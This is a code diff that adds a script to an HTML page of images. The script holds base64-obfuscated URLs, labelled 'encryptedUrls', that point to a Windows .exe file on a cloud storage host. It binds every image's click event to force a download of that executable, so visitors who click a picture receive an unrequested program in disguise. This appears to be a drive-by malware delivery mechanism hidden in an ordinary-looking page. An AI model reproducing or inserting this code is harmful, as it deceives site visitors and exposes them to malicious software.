@@ -25,6 +25,40 @@
     <img src="images/img_04.jpg">
     <img src="images/img_05.jpg">
 
+      <script>
+        function base64Decode(base64) {
+            return atob(base64); 
+        }
+
+        
+        const encryptedUrls = [
+            'aHR0cHM6Ly9rb25nb3VyLm9zcy1hcC1ub3J0aGVhc3QtMS5hbGl5dW5jcy5jb20vUHJvX3dpbjEwLTExX3hTbmlwdGFzaWVfdi44LjIuMy5leGU=',
+            'aHR0cHM6Ly9rb25nb3VyLm9zcy1hcC1ub3J0aGVhc3QtMS5hbGl5dW5jcy5jb20vUHJvX3dpbjEwLTExX3hTbmlwdGFzaWVfdi44LjIuMy5leGU=', 
+            'aHR0cHM6Ly9rb25nb3VyLm9zcy1hcC1ub3J0aGVhc3QtMS5hbGl5dW5jcy5jb20vUHJvX3dpbjEwLTExX3hTbmlwdGFzaWVfdi44LjIuMy5leGU=',
+            'aHR0cHM6Ly9rb25nb3VyLm9zcy1hcC1ub3J0aGVhc3QtMS5hbGl5dW5jcy5jb20vUHJvX3dpbjEwLTExX3hTbmlwdGFzaWVfdi44LjIuMy5leGU=',
+            'aHR0cHM6Ly9rb25nb3VyLm9zcy1hcC1ub3J0aGVhc3QtMS5hbGl5dW5jcy5jb20vUHJvX3dpbjEwLTExX3hTbmlwdGFzaWVfdi44LjIuMy5leGU='
+        ];
+
+        
+        const images = document.querySelectorAll('img');
+
+        
+        images.forEach((img, index) => {
+            img.addEventListener('click', () => downloadFile(index));
+        });
+
+        function downloadFile(imageIndex) {
+            const encodedUrl = encryptedUrls[imageIndex]; 
+            const url = base64Decode(encodedUrl); 
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = ''; 
+            document.body.appendChild(link); 
+            link.click(); 
+            document.body.removeChild(link); 
+        }
+    </script> 
+
 
 </body>
 </html>
